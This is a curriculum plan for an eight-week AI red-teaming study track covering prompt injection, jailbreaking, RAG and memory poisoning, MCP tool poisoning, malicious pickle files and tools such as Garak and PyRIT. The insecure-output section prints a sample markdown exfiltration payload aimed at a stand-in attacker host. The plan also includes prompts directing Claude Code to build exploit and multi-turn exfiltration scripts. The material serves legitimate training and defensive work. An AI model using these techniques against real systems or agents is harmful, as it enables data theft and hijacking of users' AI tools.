# Track 10: AI/ML Security

**Duration:** 8 weeks | **Hours/week:** 18 | **Priority:** HIGH — THIS IS YOUR CAREER GOAL
**Goal:** AI red teaming skills — understand AI systems deeply enough to find and exploit their vulnerabilities

**Weekly Schedule:**

- Weekdays: 8 hours
- Saturday: 5 hours
- Sunday: 5 hours

-----

## Why Right After Architecture?

You just spent 12 weeks learning software architecture (Track 8). Now you apply that systems thinking to AI:

- **You understand system architecture** — RAG, agents, and production AI are systems with components, interfaces, and attack surfaces
- **You don't need Python syntax first** — Claude Code writes the Python for labs, scripts, and exploit code. You focus on understanding concepts and finding vulnerabilities
- **Architecture knowledge maps to AI systems** — dependency injection, service layers, and API design are how production AI systems are built. You already know how to think about them

**Your role as architect:** You study how AI systems work, identify architectural weaknesses, and direct Claude Code to build exploit tools and vulnerable test applications. You don't type Python — you think like a red teamer.

-----

## Phase Overview

|Phase|Weeks|Focus                           |AI Engineering Chapters|Red Teaming AI Chapters|
|-----|-----|--------------------------------|-----------------------|-----------------------|
|1    |21-22|ML Fundamentals                 |Ch 2: Foundation Models|Ch 1-2: Mindset + Methodology|
|2    |23-24|HTB Academy Labs                |-                      |Ch 3, 4, 5, 6, 8: Core Attacks|
|3    |25-26|RAG/Agents + Supply Chain       |Ch 5-6: Prompt Eng + RAG|Ch 7: Agentic Exploitation|
|4    |27-28|Evaluation + Advanced CTF       |Ch 3-4, 7, 10          |Ch 9-10: Advanced + Reporting|

**AI Engineering (Huyen) — You're reading 6 of 10 chapters.** Skipping intro, dataset engineering, and inference optimization.

|Chapter|Title                                          |What to Do                                              |
|-------|-----------------------------------------------|---------------------------------------------------------|
|1      |Introduction to Building AI Apps with FMs      |SKIP — Overview; you'll absorb this from other chapters  |
|2      |Understanding Foundation Models                |⭐ READ (Week 22) — Model internals, training, scaling    |
|3      |Evaluation Methodology                         |⭐ READ (Week 27) — How to measure attack success         |
|4      |Evaluate AI Systems                            |⭐ READ (Week 27) — Testing AI systems objectively        |
|5      |Prompt Engineering                             |⭐ READ (Week 26) — CRITICAL for attacks: injection, adversarial suffixes|
|6      |RAG and Agentic Patterns                       |⭐ READ (Week 25) — CRITICAL: RAG architecture + attack surfaces|
|7      |Finetuning                                     |SKIM (Week 27) — Attack implications only; skip technique details|
|8      |Dataset Engineering                            |SKIP — Data pipeline engineering, not relevant to red teaming|
|9      |Inference Optimization                         |SKIP — Quantization/serving, reference only if needed    |
|10     |AI Engineering Architecture and User Feedback  |⭐ READ (Week 27) — Production attack surfaces, monitoring|

**Red Teaming AI (Dursey) — You're reading 10 of 11 chapters.** Skipping only the futures chapter.

|Chapter|Title                                             |What to Do                                              |
|-------|--------------------------------------------------|---------------------------------------------------------|
|1      |The New Attack Surface: Thinking in Graphs        |⭐ READ (Week 21) — Mental model for AI attack surfaces   |
|2      |The Engagement: An AI Red Teamer's Methodology    |⭐ READ (Week 21) — Red team methodology, your career framework|
|3      |Reconnaissance: Mapping the AI Terrain            |⭐ READ (Week 23) — Recon techniques before HTB labs      |
|4      |Poisoning the Well: Corrupting AI Data            |⭐ READ (Week 24) — Data poisoning attacks, pairs with HTB labs|
|5      |Fooling the Oracle: Evasive Attacks at Inference  |⭐ READ (Week 24) — Adversarial examples, evasion attacks |
|6      |Hijacking the Conversation: LLM Prompt Injection  |⭐ READ (Week 23) — Core skill, pairs with HTB prompt injection labs|
|7      |Seizing Control: Agentic System Exploitation      |⭐ READ (Week 25) — Pairs with RAG/agent building week    |
|8      |Stealing the Brain: Model Extraction              |⭐ READ (Week 24) — Model theft attacks, pairs with HTB labs|
|9      |Graphs of Pain: Advanced Attack Sequences         |⭐ READ (Week 28) — Advanced chained attacks for final assessment|
|10     |The Endgame: Reporting for Maximum Impact         |⭐ READ (Week 28) — Red team reporting, essential for portfolio|
|11     |The Next Frontier: The Future of AI Red Teaming   |SKIP — Speculative futures, not actionable now            |

**Note:** Phase 5 (Go for AI Security) has moved to Track 11 as the capstone, where Go architecture skills + AI security knowledge combine.

-----

## Resources

### Primary Platform

|Resource             |Cost        |Focus                           |
|---------------------|------------|--------------------------------|
|HTB Academy AI Red Teamer|~$20/month x 2|Hands-on labs, prompt injection, model attacks|

### Free Resources

|Resource          |URL                  |Focus                    |
|------------------|---------------------|-------------------------|
|Fast.ai           |fast.ai              |ML fundamentals          |
|Hugging Face NLP  |huggingface.co/learn |Transformers, NLP        |
|OWASP LLM Top 10  |genai.owasp.org      |LLM vulnerabilities      |
|MITRE ATLAS       |atlas.mitre.org      |Adversarial ML threat framework (ATT&CK for AI)|
|HackAPrompt       |hackaprompt.com      |Prompt injection practice|
|Dreadnode/Crucible|crucible.dreadnode.io|CTF-style challenges     |

### AI Red Teaming Tools (Free, Open Source)

|Tool              |URL                                    |Focus                    |
|------------------|---------------------------------------|-------------------------|
|Garak (NVIDIA)    |github.com/NVIDIA/garak                |LLM vulnerability scanner — the "nmap for LLMs". Automated probes for prompt injection, jailbreaks, data leakage, hallucination|
|PyRIT (Microsoft) |github.com/Azure/PyRIT                 |Programmable red team framework. Multi-turn adaptive attack chains. Used in 100+ Microsoft red team ops|

**Why both tools:** Garak is a scanner (point and shoot — automated vulnerability discovery). PyRIT is a framework (you script custom multi-step attack strategies). Use Garak first for broad coverage, then PyRIT for deep, targeted attacks.

### Professional Frameworks (Free)

|Framework         |URL                                    |Focus                    |
|------------------|---------------------------------------|-------------------------|
|NIST AI RMF       |nist.gov/itl/ai-risk-management-framework|AI risk governance — the industry standard for framing findings in red team reports (~40 pages)|
|NIST Gen AI Profile|nvlpubs.nist.gov/nistpubs/ai/nist.ai.600-1.pdf|Generative AI-specific risks — extends AI RMF for LLMs|
|Google SAIF       |saif.google                            |Secure AI Framework — threat taxonomy, risk map, controls for AI systems|
|AI Incident Database|incidentdatabase.ai                  |1,200+ real-world AI failures — case studies for threat modeling|

### Books

|Resource                                      |Cost         |Status/Focus              |
|----------------------------------------------|-------------|--------------------------|
|Developer's Playbook for LLM Security (Wilson)|Already owned|Read in Track 7           |
|AI Engineering (Huyen)                        |~$50         |Production AI systems     |
|Red Teaming AI (Dursey)                       |Already owned|Red teaming               |

### 2026 Developments — Agentic & MCP Security (added after plan authored; all FREE)

The field moved between when this plan was written and 2026. These are **new attack surfaces**, not more of the same — the biggest methodological shift of 2026 is that agents (autonomous, tool-using, memory-holding) are now the primary target, and the protocol that wires tools to models (MCP) is a fast-growing vulnerability class. This is squarely your career goal, so treat these as core, not optional.

|Resource                                      |URL                  |Why it matters                        |
|----------------------------------------------|---------------------|--------------------------------------|
|**OWASP Top 10 for Agentic Applications (2026)**|genai.owasp.org|The new benchmark for agent security (ASI01–ASI10), published Dec 2025. Separate from the LLM Top 10. Read this — it is the vocabulary the industry now uses|
|**MCP security corpus**                       |NSA MCP hardening guide + OWASP GenAI + genai.owasp.org|Model Context Protocol had 40+ CVEs disclosed Jan–Apr 2026 (tool poisoning, confused-deputy, token passthrough). MCP is how Claude Code/agents get tools — you already use it (Track 3). Now learn to attack it|
|**DeepTeam**                                  |trydeepteam.com      |Open-source LLM red-teaming framework mapped directly to OWASP LLM Top 10 + the Agentic Top 10 + NIST AI RMF. Complements Garak/PyRIT|
|**Inspect (UK AISI)**                         |inspect.aisi.org.uk  |The standard open eval framework for AI safety/security testing; Petri and much 2026 tooling is built on it|
|**Petri (Anthropic)**                         |github.com/safety-research/petri|Anthropic's MIT-licensed auditing tool — auditor/target/judge loop over simulated tool-use scenarios. Directly relevant to agentic misalignment testing|

**The OWASP Agentic Top 10 (ASI01–ASI10), for reference:** ASI01 Agent Goal Hijack · ASI02 Tool Misuse & Exploitation · ASI03 Identity & Privilege Abuse · ASI04 Agentic Supply Chain · ASI05 Unexpected Code Execution (RCE) · ASI06 Memory & Context Poisoning · ASI07 Insecure Inter-Agent Communication · ASI08 Cascading Failures · ASI09 Human-Agent Trust Exploitation · ASI10 Rogue Agents.

*(These fold into Week 25, the agent-security week. See the note there. Certifications — CAISP, OffSec OSAI+/AI-300, EC-Council COASP, SANS SEC536 — also emerged in 2026 but are expensive and optional; HTB Academy remains the plan's hands-on spine. Revisit certs only when job-hunting, as a résumé signal.)*

-----

## Phase 1: ML Fundamentals (Weeks 21-22)

|Week|Focus                                |Resource               |Hours|
|----|-------------------------------------|-----------------------|-----|
|21  |Deep Learning basics, neural networks|Fast.ai Part 1 + **Dursey Ch 1-2**|18   |
|22  |NLP, transformers, foundation models |Hugging Face NLP + **AI Engineering Ch 2**|18|

**Week 21: Deep Learning Foundations + Red Teaming Mindset**

**Monday-Tuesday (6 hours): Red Teaming AI Ch 1-2**
- **Ch 1: Thinking in Graphs** — Mental model for AI attack surfaces. How to think about AI systems as attack graphs
- **Ch 2: The Engagement** — AI red teamer's methodology. This is YOUR career framework — internalize it

**Wednesday-Sunday (12 hours): Fast.ai Part 1**
- Fast.ai Practical Deep Learning Part 1
- Focus on understanding: neural networks, training, evaluation
- Understand loss functions, optimization concepts
- Claude Code runs the notebooks — you study the architecture and results

**Week 22: Foundation Models Deep Dive**

**Monday-Wednesday (6 hours): Hugging Face NLP Course**
- Transformers architecture — understand the system
- Attention mechanisms — how models "focus"
- Tokenization — how text becomes numbers
- Pre-training and fine-tuning concepts

**Thursday-Friday (4 hours): AI Engineering Chapter 2**
- **Training data curation** — How LLMs learn (and what can go wrong)
- **Model architecture decisions** — Understanding model internals
- **Scaling laws** — How model size affects capabilities and vulnerabilities
- **Post-training techniques** — Supervised and preference finetuning
- **Sampling and probabilistic nature** — Why outputs vary, temperature attacks

**Weekend (8 hours):**
- Continue Hugging Face course
- Study transformer architecture diagrams
- Document foundation model concepts in Obsidian

**Why This Matters:**
You already understand LLM vulnerabilities from Track 7 (Wilson book). Now you build the ML foundation to:
- Understand HOW models work internally (better attacks)
- Know training data vulnerabilities
- Exploit model architecture weaknesses
- Understand sampling and temperature manipulation

-----

## Phase 2: HTB Academy AI Red Teamer Labs (Weeks 23-24)

**Primary Resource:** HTB Academy AI Red Teamer Path (~$20/month subscription)

|Week|Focus                                |HTB Modules                      |
|----|-------------------------------------|---------------------------------|
|23  |Prompt injection, jailbreaking       |HTB labs + **Dursey Ch 3, 6**|
|24  |Model privacy attacks, adversarial AI|HTB labs + **Dursey Ch 4, 5, 8**|

**Week 23 Reading:** Read Dursey Ch 3 (Reconnaissance) and Ch 6 (Prompt Injection) before starting HTB labs. These give you the methodology and attack taxonomy that make the labs more effective.

**Week 24 Reading:** Read Dursey Ch 4 (Data Poisoning), Ch 5 (Evasion Attacks), and Ch 8 (Model Extraction) alongside HTB labs on the same topics.

**What You'll Do:**
- Complete hands-on labs attacking real AI systems
- **Run Garak scans** against lab targets before manual testing — automated vulnerability discovery
- Direct Claude Code to build prompt injection exploits
- Test jailbreaking techniques against LLMs
- Execute model privacy attacks
- Document findings in Obsidian

**Garak Setup (Week 23, Day 1):**
Install and run your first scan before starting HTB labs:
```
"Direct Claude Code: Install garak (pip install garak) and run a basic
scan against a test LLM endpoint. Show me the probe categories available
(prompt injection, jailbreak, data leakage, etc.) and explain the output."
```
Use Garak throughout Weeks 23-24 as your automated scanner alongside manual HTB labs.

**Your Architect Approach:**
For each lab:
1. **Understand the target architecture** — What system am I attacking? What components?
2. **Identify the attack surface** — Where are the interfaces? What inputs do I control?
3. **Direct Claude Code to build the exploit** — "Write a Python script that tests this LLM endpoint for prompt injection using these techniques..."
4. **Analyze results** — Did the attack work? Why or why not? What does this tell you about the architecture?
5. **Document findings** — Professional red team notes in Obsidian

**Supplement with OWASP LLM Top 10:** Review concepts as you encounter them in labs

-----

## Phase 3: Production LLM Apps & Supply Chain (Weeks 25-26)

|Week|Focus                                 |Resource                    |
|----|--------------------------------------|----------------------------|
|25  |**RAG & Agent security**              |**AI Engineering Ch 6 + Dursey Ch 7 + LangChain hands-on**|
|26  |**Prompt Eng + Output Handling (LLM02) + Supply Chain**|**AI Engineering Ch 5, 7, 10 + OWASP LLM02 + hands-on exploits**|

**Week 25: RAG & Agent Security - CRITICAL**

**Why This Week:**
- Most production LLM apps use RAG (Retrieval Augmented Generation)
- Agent-based systems have unique vulnerabilities
- You need to understand the ARCHITECTURE to attack it effectively
- This is where your Track 8 systems thinking pays off

**Monday (2 hours): Red Teaming AI Chapter 7 - Agentic System Exploitation**
- How attackers exploit agentic AI systems
- Tool abuse, control flow hijacking, prompt injection via tools
- Read BEFORE building your own agent — you'll know what to attack

**Tuesday-Wednesday (4 hours): AI Engineering Chapter 6 - RAG and Agents** MUST READ
- **Retrieval-Augmented Generation (RAG):**
  - Term-based retrievers (BM25, TF-IDF)
  - Embedding-based retrievers (vector databases)
  - Hybrid retrieval approaches
  - RAG architecture and components
  - **Attack surfaces:** Document injection, retriever manipulation, context poisoning

- **Agentic Patterns:**
  - Tool access and function calling
  - Reflection mechanisms
  - Planning and reasoning loops
  - **Attack surfaces:** Tool misuse, infinite loops, prompt injection via tools

- **Memory Systems:**
  - Short-term vs long-term memory
  - Conversation history management
  - **Attack surfaces:** Memory poisoning, history injection

**Frame the week with the OWASP Agentic Top 10 (2026) — ~1 hr, Monday.** Before building, skim the OWASP Top 10 for Agentic Applications (see the "2026 Developments" resources above). It's the current industry vocabulary and most of it maps onto what you build this week: ASI01 Agent Goal Hijack and ASI02 Tool Misuse pair with Dursey Ch 7; ASI06 Memory & Context Poisoning is exactly the memory attack above. When you attack your agent (weekend), label each finding with its ASI ID — that's how a 2026 red-team report reads.

**MCP as an attack surface (~1 hr, fold into the build).** Your agent's tools may be wired via MCP — the same protocol you set up for Claude Code in Track 3. In 2026 that's a top attack surface: **tool poisoning** (a malicious tool description injects instructions), **confused-deputy** and **token passthrough** (a server forwards your credentials downstream). If your agent uses any MCP tool, add one deliberately poisoned tool description and watch it hijack the agent's behavior, then note the fix (validate tool metadata, don't pass tokens through). Reference the NSA MCP hardening guide and OWASP.

**Wednesday-Friday (6 hours): Direct Claude Code to Build RAG App**
Now that you understand RAG/agent architecture, direct Claude Code to build one:

1. **Document QA System (3 hours)** — Direct Claude Code:
   ```
   "Build a Python RAG application with:
   - ChromaDB vector database
   - Document embedding and storage
   - Retrieval chain: query → embed → retrieve → generate
   - Use LangChain for orchestration
   - Include logging for all retrieval steps (for later attack analysis)"
   ```

2. **LLM Agent (3 hours)** — Direct Claude Code:
   ```
   "Build a LangChain agent with:
   - Tools: calculator, web search, Wikipedia
   - Conversational memory
   - Multi-step reasoning
   - Tool execution logging"
   ```

**Weekend (8 hours): Attack Your Own Apps**

Direct Claude Code to build attack scripts, then analyze results:

1. **RAG Attacks (4 hours)**
   - Inject malicious documents into vector database
   - Context poisoning (manipulate retrieval results)
   - Embedding attacks (adversarial documents)
   - Prompt injection via retrieved context
   - Test different retrievers (term-based vs embedding)

2. **Agent Attacks (4 hours)**
   - Make agent call wrong tools
   - Cause infinite reasoning loops
   - Exploit tool execution vulnerabilities
   - Memory poisoning attacks
   - Jailbreak via multi-step chains

**Deliverable:**
- Working RAG app + agent (GitHub — built by Claude Code, reviewed by you)
- Attack documentation (Obsidian + blog post)
- 5+ attack vectors documented
- Defensive recommendations

**Week 26: ML Supply Chain + Prompt Engineering**

**Monday-Tuesday (6 hours): ML Supply Chain Attacks**

**Theory (1 hour):**
Review supply chain concepts from Track 7 (Wilson book Chapter 8):
- Malicious models and backdoored weights
- Pickle exploits in PyTorch/TensorFlow
- Poisoned datasets
- ML-BOM and provenance
- Reference: [MITRE ATLAS](https://atlas.mitre.org/) — adversarial ML threat framework (the "ATT&CK for AI")

**Hands-On (5 hours):** Direct Claude Code to build:
1. **Malicious pickle file (2 hours)** — Understand the exploit architecture:
   - How pickle deserialization enables arbitrary code execution
   - Direct Claude Code to create PoC
   - Defensive: Convert to safetensors format

2. **Model verification tool (3 hours)** — Direct Claude Code:
   ```
   "Build a Python script that scans Hugging Face models for security:
   - Check for pickle files (unsafe)
   - Verify safetensors usage (safe)
   - Scan dependencies for known CVEs
   - Check model cards for red flags
   - Verify digital signatures"
   ```

**Wednesday-Thursday (4 hours): AI Engineering Ch 5 - Prompt Engineering** CRITICAL

This is THE chapter for AI red teaming:
- **Prompt Anatomy:** System prompts, user prompts, context
- **In-Context Learning:** Few-shot examples and their influence
- **Prompt Injection Attacks and Defenses:** ESSENTIAL
  - Direct vs indirect injection
  - Adversarial suffixes
  - Delimiter attacks
  - Defense strategies and why they often fail
- **Techniques for Improving Outputs:** Chain-of-thought (and how to exploit it)

**Friday (2 hours): Insecure Output Handling (OWASP LLM02)**

Prompt injection is what goes *into* the model. This is what happens to what comes *out* — and it's the other half of the same attack chain. An injected prompt that produces a payload only matters because something downstream renders or executes that payload without treating it as untrusted.

**The core principle:** LLM output is untrusted input to whatever consumes it. Every consumer is a sink.

|Sink                        |Vulnerability                                   |
|----------------------------|------------------------------------------------|
|Browser / web UI            |XSS via model-generated HTML, JS, or markdown links|
|Markdown renderer           |Image tags and links that exfiltrate data on render|
|Shell / subprocess          |Command injection from generated commands       |
|SQL layer                   |Injection from generated queries                 |
|Downstream LLM or tool call |Chained injection into the next component        |

**Why the markdown case matters most:** a model persuaded to emit `![](https://attacker/?d=<secrets>)` exfiltrates conversation contents the moment the client renders it — no user click required. This is the standard end-to-end indirect prompt injection chain: poisoned source → injected instruction → attacker-controlled output → automatic rendering.

**Why the usual defenses don't transfer:** you can't parameterize natural-language output or allowlist model responses. The mitigation lives at each sink — contextual output encoding, sandboxed/text-only rendering, stripping or safe-listing markdown, and validating tool-call arguments before execution. That's an architecture judgment, which is your lens.

**Do (2 hours):**
1. Take the RAG app you built in Week 25. Poison a source document so the model emits a markdown image tag pointing at a URL you control, and confirm the request fires when the client renders the response (check your listener's logs). That's data exfiltration via LLM02.
2. On the agent, get model output to pass a malicious argument into a tool call with no validation.
3. Fix both: text-only rendering / markdown sanitization for the UI, argument validation for the tool. Document the attack and the fix in Obsidian.

**Reference:** [OWASP LLM02: Insecure Output Handling](https://genai.owasp.org/llmrisk/llm02-insecure-output-handling/)

**If HTB modules from Weeks 23-24 are unfinished, fold them into the weekend instead.**

**Weekend (6 hours): Apply Prompt Engineering to Attacks**
- Revisit your RAG app and agent from Week 25
- Apply prompt engineering techniques from Ch 5 as attack vectors
- Test adversarial suffixes, delimiter attacks, chain-of-thought exploitation
- Document new attack findings in Obsidian

-----

## Phase 4: Evaluation & Advanced CTF (Weeks 27-28)

|Week|Focus                               |Resource             |
|----|------------------------------------|--------------------|
|27  |AI Engineering (remaining chapters) + HackAPrompt|Ch 3-4, 7, 10 + hackaprompt.com|
|28  |Crucible CTF + Automated Red Team Agent + Final Assessment|crucible.dreadnode.io + **Dursey Ch 9-10** + Claude SDK|

**Week 27: Evaluation + Production AI + HackAPrompt**

**Monday-Wednesday (6 hours): AI Engineering — Remaining Chapters**

- **Ch 3-4: Evaluation (3 hours)** — How to measure attack success objectively. Build evaluation pipeline for your attacks.
- **Ch 10: AI Engineering Architecture (2 hours)** — Attack surfaces in production AI systems. How are real systems deployed?
- **Ch 7: Finetuning (1 hour)** — Skim for attack implications only: how does finetuning change defenses?

**Thursday-Weekend (12 hours): HackAPrompt CTF**
- Complete as many levels as possible
- Direct Claude Code to automate attack attempts
- Apply evaluation techniques from Ch 3-4
- Measure success rates across different attack vectors
- Document successful prompts in Obsidian
- Blog post: "My HackAPrompt Solutions + Success Rate Analysis"

**Week 28: Advanced CTF + PyRIT + Final Portfolio**

**Monday (2 hours): Red Teaming AI Ch 9-10**
- **Ch 9: Advanced Attack Sequences** — Chained multi-step attacks. Read before your final assessment
- **Ch 10: Reporting for Maximum Impact** — How to write red team reports that drive action. Essential for your portfolio piece

**Tuesday-Wednesday (4 hours): Crucible CTF**
- [Crucible by Dreadnode](https://crucible.dreadnode.io/)
- AI red teaming CTF challenges
- Apply all techniques from previous weeks

**Wednesday-Thursday (4 hours): PyRIT — Automated Multi-Turn Attacks**

PyRIT (Microsoft's Python Risk Identification Toolkit) goes beyond what Garak does — it scripts adaptive, multi-turn attack chains. Direct Claude Code to build PyRIT attack scripts:
```
"Using Microsoft PyRIT, build an automated red team script that:
- Targets an LLM API endpoint
- Uses PyRIT's orchestrators for multi-turn conversation attacks
- Chains prompt injection → follow-up exploitation → data exfiltration
- Adapts tactics based on model responses
- Scores results using PyRIT's built-in classifiers
- Logs full attack sessions for replay and analysis"
```

Compare PyRIT's multi-turn approach with the Garak scanning you did in Weeks 23-24. When would you use each?

**Also explore:** Claude Agent SDK for building your own custom red team agent (if PyRIT doesn't cover your use case).

**Friday (2 hours): Professional Frameworks for Reporting**

Before writing your final report, study the frameworks that professional AI red teamers reference:
- **NIST AI RMF** (~40 pages core) — governance language for findings. Map your vulnerabilities to NIST risk categories.
- **NIST Generative AI Profile** — LLM-specific risk extensions
- **Google SAIF Risk Map** (saif.google) — threat taxonomy for scoping coverage. Did you test all attack surfaces?
- **AI Incident Database** (incidentdatabase.ai) — search for real-world precedents similar to your findings. Citing past incidents strengthens reports.

**Weekend (8 hours): Final Red Team Assessment Portfolio Piece**

1. **Target Selection (1 hour)** — Choose or build a complex vulnerable application
2. **Automated Scanning (1 hour)** — Run Garak + PyRIT against the target for broad coverage
3. **Manual Red Team Engagement (4 hours):**
   - Reconnaissance (model identification, architecture)
   - Vulnerability assessment (prompt injection, RAG poisoning, etc.)
   - Exploitation (demonstrate impact)
   - Find what the automated tools missed
4. **Professional Report Writing (2 hours):**
   - Frame findings using NIST AI RMF categories
   - Reference MITRE ATLAS techniques
   - Cite AI Incident Database precedents
   - Include automated scan results (Garak/PyRIT) + manual findings

**Deliverable:**
- Professional red team assessment report (framed with NIST AI RMF)
- PoC exploits (GitHub)
- Garak scan results + PyRIT attack logs
- Defensive playbook
- Blog post on findings
- Portfolio piece for job applications

-----

## Projects & Outputs

|Week|Project                      |Output                               |Share             |
|----|-----------------------------|-------------------------------------|------------------|
|23-24|HTB Academy lab completions |All modules completed                |HTB profile       |
|23-24|**Garak scans of lab targets**|**Automated vulnerability scan results**|**GitHub**      |
|23-24|Prompt injection PoC        |Working exploit with automation      |GitHub            |
|25  |**Vulnerable RAG app**       |**Document QA + LLM agent**          |**GitHub**        |
|25  |**RAG/Agent attacks**        |**5+ attack vectors documented**     |**GitHub + Blog** |
|26  |**Malicious pickle exploit** |**PyTorch RCE demonstration**        |**Demo only**     |
|26  |**Model verification tool**  |**Scan Hugging Face models**         |**GitHub**        |
|27  |**Attack evaluation pipeline**|**Automated testing framework**     |**GitHub**        |
|27  |HackAPrompt solutions        |Documented strategies + success rates|Blog + GitHub     |
|28  |Crucible CTF solutions       |Novel attack vectors                 |GitHub            |
|28  |**PyRIT attack scripts**     |**Multi-turn adaptive attack chains**|**GitHub**        |
|28  |**Red team assessment**      |**Professional report (NIST AI RMF framing)**|**Portfolio**|

-----

## Key Concepts

**From Track 7: LLM Security Primer (Wilson book — Theory):**
- Prompt Injection (direct vs indirect)
- Jailbreaking techniques
- OWASP LLM Top 10
- Zero Trust for LLMs
- Supply Chain Security (ML-BOM)

**From AI Engineering Book (6 of 10 chapters):**
- **Ch 2:** Foundation model internals, training data, scaling laws
- **Ch 3-4:** Evaluation methodology, testing AI systems objectively
- **Ch 5:** Prompt engineering, injection attacks and defenses
- **Ch 6:** RAG architecture, agents with tools, memory systems
- **Ch 10:** Production architecture, monitoring, attack surfaces

**From Red Teaming AI (Dursey) (10 of 11 chapters):**
- **Ch 1-2:** Attack surface graphs, red team engagement methodology
- **Ch 3:** Reconnaissance and AI terrain mapping
- **Ch 4-5:** Data poisoning, evasion attacks at inference
- **Ch 6:** LLM prompt injection (deep dive)
- **Ch 7:** Agentic system exploitation
- **Ch 8:** Model extraction and theft
- **Ch 9:** Advanced chained attack sequences
- **Ch 10:** Red team reporting for maximum impact

**From HTB Academy (Hands-On):**
- Practical prompt injection exploitation
- Jailbreaking real LLM systems
- Model extraction attacks
- Data poisoning demonstrations
- Attack automation

**AI Red Teaming Tools:**
- **Garak (NVIDIA):** Automated LLM vulnerability scanning — probes for prompt injection, jailbreaks, data leakage, hallucination
- **PyRIT (Microsoft):** Programmable multi-turn attack framework — adaptive chains, scoring, session replay
- **When to use each:** Garak for broad automated scanning, PyRIT for deep targeted multi-turn attacks

**Professional Frameworks:**
- **NIST AI RMF:** Governance language for red team reports — Govern, Map, Measure, Manage
- **NIST Gen AI Profile:** LLM-specific risk extensions to AI RMF
- **Google SAIF:** Threat taxonomy and risk map — covers data, infrastructure, model, and application layers
- **MITRE ATLAS:** Adversarial ML techniques mapped like ATT&CK — for technique classification
- **AI Incident Database:** Real-world AI failures — cite precedents in reports

**Production LLM Security:**
- **RAG Architecture:** Term-based vs embedding retrievers
- **RAG Poisoning:** Inject malicious documents into vector DBs
- **Agent Exploits:** Tool misuse, infinite loops, prompt injection via tools
- **Memory Attacks:** Conversation history poisoning
- **LangChain Security:** Framework-specific vulnerabilities
- **ML Supply Chain:** Pickle RCE, malicious models, backdoored weights
- **Model Verification:** SafeTensors vs pickle, provenance checking
- **Evaluation Pipelines:** Automated attack testing, success rate measurement
- **Production Attacks:** API exploits, inference DoS, cache poisoning

-----

## Claude Code Integration

Use Claude Code throughout this track as your implementation tool:

**Building Targets:**
```
"Build a vulnerable RAG application with LangChain that I can
test for prompt injection. Include: vector database, document
ingestion, retrieval chain, and response generation."
```

**Building Exploits:**
```
"Write a Python script that tests an LLM API endpoint
for prompt injection using these attack patterns:
[list]. Log all responses for analysis."
```

**Analysis:**
```
"Explain how RAG poisoning works at a technical level.
I understand vector databases from reading about them.
How do adversarial documents manipulate embedding similarity?"
```

-----

## Checkpoint

Before moving to Track 9: Python Core, you should be able to:

**Conceptual Understanding:**
- Explain foundation model internals (training, scaling, sampling)
- Describe RAG architecture and its attack surfaces
- Explain how LLM agents work and their vulnerabilities
- Explain insecure output handling (LLM02): why model output is untrusted input to every downstream sink, and where it gets encoded/validated
- Understand ML supply chain risks
- Design evaluation pipelines for measuring attack effectiveness

**Practical Experience (via Claude Code):**
- Complete HTB Academy AI Red Teamer modules
- Run Garak scans against LLM targets (automated vulnerability discovery)
- Direct Claude Code to build prompt injection exploits
- Direct Claude Code to build RAG applications + attack them
- Exploit insecure output handling (markdown exfil / XSS / unvalidated tool args) end-to-end and remediate it at the sink
- Direct Claude Code to build model verification tools
- Build PyRIT attack scripts (multi-turn adaptive chains)
- Solve HackAPrompt and Crucible challenges
- Conduct professional AI red team assessment (framed with NIST AI RMF)

**Portfolio Pieces:**
- HTB Academy profile with completed modules
- Garak scan results + analysis (GitHub)
- Vulnerable RAG app + LLM agent (GitHub)
- RAG/Agent attack documentation (blog post)
- Model verification tool (GitHub)
- Attack evaluation pipeline (GitHub)
- PyRIT multi-turn attack scripts (GitHub)
- Automated red team agent built with Claude Code SDK (GitHub)
- Professional red team assessment report (portfolio)
- 5+ blog posts on AI security topics
